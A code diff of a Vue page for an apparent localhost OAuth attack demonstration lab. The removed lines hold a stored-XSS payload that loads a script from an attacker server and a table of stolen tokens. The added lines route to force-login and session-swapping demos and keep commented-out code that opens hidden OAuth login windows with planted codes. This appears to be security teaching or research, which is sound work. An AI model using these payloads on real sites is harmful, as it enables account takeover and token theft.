@@ -1,127 +1,128 @@
 <template>
-  <div class="dashboard">
-    <h1>This is the Attacker's page</h1>
-    <h2>XSS Attack Demos</h2>
-    <h4>1. Unsuccessful Way - Iframe(GitHub)</h4>
-    <input style="margin-right: 5px;" placeholder="Enter your username here ..." v-model="XSSInputOne" />
-    <button type="button" @click="XSSOne()">
-        <span>Submit</span>
-    </button><br>
-    <h4>2. The way to succeed under certain conditions - Iframe(Twitter)</h4>
-    <input style="margin-right: 5px;" placeholder="Enter your username here ..." v-model="XSSInputTwo" />
-    <button type="button" @click="XSSTwo()">
-        <span>Submit</span>
-    </button>
-    <h4>3. Stolen Token(s)</h4>
-    <table>
-        <tr>
-          <th>Token</th>
-          <th>Stolen Date</th>
-        </tr>
-        <tr v-for="(item, index) in stolenTokens" :key="index">
-          <td>{{ item.usertoken }}</td>
-          <td>{{ item.stolen_date }}</td>
-        </tr>
-      </table><br/>
-  </div>
-</template>
-
-<script>
-import { defineComponent, ref } from 'vue';
-import axios from 'axios';
-
-export default defineComponent({
-  setup() {
-    const XSSInputOne = ref('');
-    const XSSInputTwo = ref('');
-    const XSSPostForm = ref({
-      username: '',
-      post_title: '',
-      post_content: '',
-    })
-    const stolenTokens = ref([]);
-
-    const XSSOne = async () => {
-      XSSPostForm.value.username = XSSInputOne.value;
-      XSSPostForm.value.post_title = 'XSSONE POST';
-      XSSPostForm.value.post_content = '<iframe src="https://github.com/login/oauth/authorize?client_id=d83ac1ef7822f3087e4b&redirect_uri=http://localhost:8080/login&scope=user"></iframe>';
-      // We only indicate that iframe is impossible here
-      try {
-        if (XSSInputOne.value.length > 0 && XSSInputOne.value.includes('GitHub')) {
-          const addPostRes = await axios.post('http://localhost:8000/dashboard/add_post', XSSPostForm.value);
-          if (addPostRes.data.code == 200) {
-            alert('XSS Succeeded');
-          } else {
-            alert('Unknown Error Occurred');
-          }
-        } else {
-          alert('Please use a GitHub account');
-        }
-      } catch (error) {
-        alert('Unknown Error Occurs');
-      } finally {
-        // Empty here
-      }
-    };
-
-    const XSSTwo = async () => {
-      XSSPostForm.value.username = XSSInputTwo.value;
-      XSSPostForm.value.post_title = 'XSSTwo POST';
-      XSSPostForm.value.post_content = "<h6 onclick=document.body.appendChild(document.createElement('script')).src='http://localhost:8001/static/xssattack.js'>Click Me Please!</h6>";
-      // We only indicate that iframe is impossible here
-      try {
-        if (XSSInputTwo.value.length > 0 && XSSInputTwo.value.includes('Twitter')) {
-          const addPostRes = await axios.post('http://localhost:8000/dashboard/add_post', XSSPostForm.value);
-          if (addPostRes.data.code == 200) {
-            alert('XSS Succeeded');
-          } else {
-            alert('Unknown Error Occurred');
-          }
-        } else {
-          alert('Please use a Twitter account');
-        }
-      } catch (error) {
-        alert('Unknown Error Occurs');
-      } finally {
-        // Empty here
-      }
-    };
-
-    const getStolenTokens = async () => {
-      try {
-        const stolenTokensData = await axios.get('http://localhost:8001/dashboard/get_stolen_tokens');
-        if (stolenTokensData.data.code == 200) {
-          stolenTokens.value.splice(0, stolenTokens.value.length);
-          stolenTokens.value = stolenTokens.value.concat(stolenTokensData.data.stolen_tokens);
-        }
-      } catch (error) {
-        alert('Unknown Error Occurs');
-      } finally {
-        // Empty here
-      }
+    <div class="dashboard">
+      <h1>This is the Attacker's Website</h1>
+      <h2> Dashboard</h2>
+      <div class="flex-container"> 
+        <div >
+          <!-- <img src="@/assets/cat-cats.gif"> -->
+          <br>
+          <!-- <button type="button" ref="forceLoginBtn" @click="forceLogin()">
+            <span>Download image/Force login</span>
+          </button> -->
+          <!-- <a :href="evil_link">visit website twitter</a> -->
+        </div>
+      </div>
+      <!-- <iframe src="http://localhost:8080/login?code=4a0622b77c02948efe30&amp;login_method=githubLoginSF" style="width:100%;"> -->
+      <!-- <iframe src="https://github.com/login/oauth/authorize?client_id=d83ac1ef7822f3087e4b&amp;redirect_uri=http://localhost:8080/login&amp;scope=user" style="width:100%;">
+      </iframe> -->
+  
+      <!-- <iframe src="http://localhost:8080/login?code=4a0622b77c02948efe30&amp;login_method=githubLoginSF" style="width:100%;"> -->
+      <!-- <iframe src="http://localhost:8080/login?code=e8af4442c23a9d8a92a6&amp;login_method=githubLoginSF" style="width:100%;" hidden>
+      </iframe> -->
+      <button type="button"  @click="router.push({name: 'xss'})">Demonstrate XSS</button>
+      <br><br>
+      <button type="button"  @click="pushForceLoginView()">Demonstrate Force Login</button>
+      <br><br>
+      <button type="button"  @click="pushSessionSwappingViewGithubSF()">Demonstrate Session Swapping Github SF</button>
+      <br><br>
+      <button type="button" @click="pushSessionSwappingViewTwitter()">Demonstrate Session Swapping Twitter</button>
+      <br><br>
+      <button type="button"  @click="pushAutoSessionSwappingGithub()">Demonstrate Session Swapping Github SF</button>
+      <br><br>
+    </div>
+  </template>
+  
+  <script>
+    import { defineComponent, ref } from 'vue';
+    import { useRouter } from 'vue-router';
+    // import axios from 'axios';
+    require("@/assets/cat-cats.gif")
+    export default defineComponent({
+      mounted: function() {
+        console.log(this.$refs.forceLoginBtn)
+        // this.$refs.forceLoginBtn.click()
+      },
+      setup() {
+        // const route = useRoute();
+        const router = useRouter();
+        const pushForceLoginView = ()=>{
+          router.push({
+            name: 'forcelogin',
+            });
+          };
+        const pushSessionSwappingViewGithubSF = ()=>{
+          router.push({
+            name: 'sessionswapping_github_sf',
+            });
+          };
+        
+        const pushSessionSwappingViewTwitter = ()=>{
+          router.push({
+            name: 'sessionswapping_twitter',
+            });
+          };
+          
+          const pushAutoSessionSwappingGithub = ()=>{
+          router.push({
+            name: 'auto_sessionswaping_github',
+            });
+          };
+        
+        // const forceLogin = () => {
+        //   console.log("forceLogin");
+        //   var a = document.createElement('a');
+        //   a.href = "../assets/cat-cats.gif";
+        //   console.log(a.href)
+        //   a.download = "../assets/cat-cats.gif";
+        //   document.body.appendChild(a);
+        //   a.click();
+        //   document.body.removeChild(a);
+        //   window.open('https://twitter.com/i/oauth2/authorize?response_type=code&client_id=UGxoMHJDc0JFcWNvMzkxeDZjMEk6MTpjaQ&redirect_uri=http%3A%2F%2Flocalhost%3A8080%2Flogin&state=state&code_challenge=challenge&code_challenge_method=plain&scope=users.read+tweet.write+tweet.read+follows.read+follows.write','windowname','width=1,height=1,left=5,top=3');
+        //   var win = window.open('http://localhost:8080/twitter_login?state=state&code=YndBbFNPTXlUa1hiblprLVN0ZkFrMUVJV2pVM1d6UnFkbUVQOWt4cTc1WmExOjE2Nzg1Mzc2NDAzMTQ6MTowOmFjOjE','windowname','width=1,height=1,left=5,top=3');
+        //   setTimeout(function() { win.close();}, 3000);
+        // };
+        const evil_link = ref('');
+      //   const getCode = async () => {
+      //   try {
+      //     const resData = await axios.get('http://localhost:8083/oauthcode/get_code');
+      //     console.log(resData)
+      //     if (resData.status === 200) {
+      //       const code = resData.data;
+      //       evil_link.value = `http://localhost:8080/login?state=state&code=${code}&login_method=twitterLoginSF`
+      //     } else {
+      //       alert('Unknown Error Occurs');
+      //     }
+      //   } catch (error) {
+      //     alert('Unknown Error Occurs');
+      //   } finally {
+      //     // Empty here
+      //   }
+      // };
+      // getCode();
+      return {
+        evil_link,
+        // forceLogin,
+        pushForceLoginView,
+        pushSessionSwappingViewGithubSF,
+        pushSessionSwappingViewTwitter,
+        pushAutoSessionSwappingGithub,
+      };
+      },
+      
+    });
+    
+  </script>
+  
+  <style>
+    /* .flex-container {
+      display: flex;
+      background-color: DodgerBlue;
     }
-
-    getStolenTokens();
-
-    return {
-      XSSInputOne,
-      XSSInputTwo,
-      stolenTokens,
-      XSSOne,
-      XSSTwo,
-    };
-  },
-});
-</script>
-
-<style>
-table {
-  width: 100%;
-}
-
-td, th {
-  border: 1px solid #1b1b1b;
-  text-align: left;
-  padding: 8px;
-}
-</style>
+    .flex-container > div {
+      background-color: #f1f1f1;
+      margin: 10px;
+      padding: 20px;
+      font-size: 30px;
+    } */
+  </style>
+  
